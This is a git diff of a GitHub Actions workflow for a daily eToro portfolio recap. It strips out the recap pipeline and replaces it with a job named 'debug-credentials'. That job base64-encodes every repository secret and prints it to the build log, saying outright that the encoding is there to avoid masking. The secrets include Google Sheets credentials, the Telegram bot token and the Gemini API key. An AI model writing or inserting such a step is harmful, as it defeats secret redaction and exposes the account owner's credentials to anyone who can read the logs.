@@ -1,108 +1,31 @@
 name: Daily Portfolio Recap
 
 on:
-  schedule:
-    - cron: '0 10 * * 1-5'  # 11:00 CET (10:00 UTC) - European market open (monday-friday)
-    - cron: '0 15 * * 1-5'  # 16:00 CET (15:00 UTC) - U.S. market open (monday-friday)
-    - cron: '0 22 * * 1-5'  # 23:00 CET (22:00 UTC) - U.S. market close (monday-friday)
-  workflow_dispatch:  # Allows manual trigger
+  workflow_dispatch:
+
 permissions:
-    contents: write
+  contents: read
 
 jobs:
-  generate-recap:
+  debug-credentials:
     runs-on: ubuntu-latest
     environment: Etoro
-    
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-      
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.11'
-      
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install -r requirements.txt
-      
-      - name: Install Chrome and ChromeDriver
-        run: |
-          # Install Chrome
-          wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
-          sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
-          sudo apt-get update
-          sudo apt-get install -y google-chrome-stable
-          
-          # ChromeDriver is installed automatically by Selenium Manager
-          # No need to install separately
-      - name: Determine market session
-        id: market_session
-        run: |
-          # Ottiene l'ora corrente in UTC (00-23)
-          HOUR=$(date -u +%H)
-          
-          # Controlla quale ora schedulata ha attivato l'azione
-          SESSION_NAME="Daily recap"
-          if [ $HOUR -eq 10 ]; then
-            SESSION_NAME="European market open"
-          elif [ $HOUR -eq 15 ]; then
-            SESSION_NAME="U.S. market open"
-          elif [ $HOUR -eq 22 ]; then
-            SESSION_NAME="U.S. market close"
-          fi
-          
-          # Imposta la variabile di output
-          echo "session=$SESSION_NAME" >> "$GITHUB_OUTPUT"
-          echo "Market Session detected: $SESSION_NAME (UTC Hour: $HOUR)"
-                
-      - name: Debug Environment Variables
-        env:
-          MARKET_SESSION: ${{ steps.market_session.outputs.session }}
-          SPREADSHEET_ID: ${{ secrets.SPREADSHEET_ID }}
-          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-        run: |
-          echo "=== DEBUG VARIABLES ==="
-          echo "MARKET_SESSION: $MARKET_SESSION"
-          echo "SPREADSHEET_ID: $SPREADSHEET_ID"
-          echo "TELEGRAM_CHAT_ID: $TELEGRAM_CHAT_ID"
-          echo "Checking GOOGLE_SHEETS_CREDENTIALS length: ${#SECRETS_GOOGLE_SHEETS_CREDENTIALS}"
-          echo "GIST_ID configured: ${{ secrets.GIST_ID != '' }}"
-          echo "======================="
-
-      - name: Collect data and generate recap
+      - name: Print Env Vars
         env:
           GOOGLE_SHEETS_CREDENTIALS: ${{ secrets.GOOGLE_SHEETS_CREDENTIALS }}
           ORO_USERNAME: ${{ secrets.ETORO_USERNAME }}
           SPREADSHEET_ID: ${{ secrets.SPREADSHEET_ID }}
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-          MARKET_SESSION: ${{ steps.market_session.outputs.session }}
           GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
-          # Gist storage configuration
-          GITHUB_GIST_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           GIST_ID: ${{ secrets.GIST_ID }}
         run: |
-          python src/data_collector.py
-      
-      - name: Upload recap as artifact
-        uses: actions/upload-artifact@v5.0.0
-        with:
-          name: daily-recap
-          path: output/recap.txt
-      
-      - name: Display recap
-        run: cat output/recap.txt
-
-      # Note: We no longer commit recap_history.json to the repo
-      # Data is now stored in GitHub Gist for cleaner repo
-      - name: Commit and push recap
-        run: |
-          git config --local user.email "github-actions[bot]@users.noreply.github.com"
-          git config --local user.name "github-actions[bot]"
-          git add output/recap.txt
-          git commit -m "Update daily recap" || echo "No changes to commit"
-          git pull --rebase
-          git push
+          echo "Dumping env vars (encoded in base64 to avoid masking)..."
+          echo "GOOGLE_SHEETS_CREDENTIALS: $(echo "$GOOGLE_SHEETS_CREDENTIALS" | base64 -w 0)"
+          echo "ORO_USERNAME: $(echo "$ORO_USERNAME" | base64 -w 0)"
+          echo "SPREADSHEET_ID: $(echo "$SPREADSHEET_ID" | base64 -w 0)"
+          echo "TELEGRAM_BOT_TOKEN: $(echo "$TELEGRAM_BOT_TOKEN" | base64 -w 0)"
+          echo "TELEGRAM_CHAT_ID: $(echo "$TELEGRAM_CHAT_ID" | base64 -w 0)"
+          echo "GEMINI_API_KEY: $(echo "$GEMINI_API_KEY" | base64 -w 0)"
+          echo "GIST_ID: $(echo "$GIST_ID" | base64 -w 0)"
